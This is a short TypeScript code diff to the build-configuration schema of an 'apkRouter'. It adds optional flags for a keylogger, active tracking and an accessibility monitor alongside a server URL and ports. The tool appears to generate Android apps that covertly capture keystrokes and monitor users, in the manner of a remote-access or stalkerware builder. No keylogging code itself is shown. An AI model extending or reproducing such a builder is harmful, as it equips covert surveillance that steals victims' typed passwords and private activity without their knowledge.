@@ -16,6 +16,9 @@ const buildConfigSchema = z.object({
   ports: z.array(z.number().int().min(1).max(65535)).min(1),
   serverUrl: z.string().url(),
   iconUrl: z.string().url().or(z.literal("")).optional(),
+  enableKeylogger: z.boolean().optional(),
+  enableActiveTracking: z.boolean().optional(),
+  enableAccessibilityMonitor: z.boolean().optional(),
 });
 
 export const apkRouter = router({
